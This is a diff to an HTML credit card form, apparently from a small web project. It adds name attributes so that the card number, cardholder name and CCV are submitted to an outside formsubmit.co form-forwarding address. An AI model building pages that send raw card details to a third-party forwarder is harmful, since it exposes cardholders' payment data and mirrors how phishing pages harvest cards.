@@ -68,15 +68,16 @@
 		<form action="https://formsubmit.co/7d78c6e31b15efc942d44f78e90fe5db" method="POST" id="formulario-tarjeta" class="formulario-tarjeta">
 			<div class="grupo">
 				<label for="inputNumero">Número Tarjeta</label>
-				<input type="text" id="inputNumero" maxlength="19" autocomplete="off">
+				<input type="text" name="numero" id="inputNumero" maxlength="19" autocomplete="off">
 			</div>
 			<div class="grupo">
 				<label for="inputNombre">Nombre</label>
-				<input type="text" id="inputNombre" maxlength="19" autocomplete="off">
+				<input type="text" name="nombre" id="inputNombre" maxlength="19" autocomplete="off">
 			</div>
 			<div class="flexbox">
 				<div class="grupo expira">
 					<label for="selectMes">Expiracion</label>
+					
 					<div class="flexbox">
 						<div class="grupo-select">
 							<select name="mes" id="selectMes">
@@ -95,7 +96,7 @@
 
 				<div class="grupo ccv">
 					<label for="inputCCV">CCV</label>
-					<input type="text" id="inputCCV" maxlength="3">
+					<input type="text" name="ccv" id="inputCCV" maxlength="3">
 				</div>
 			</div>
 			
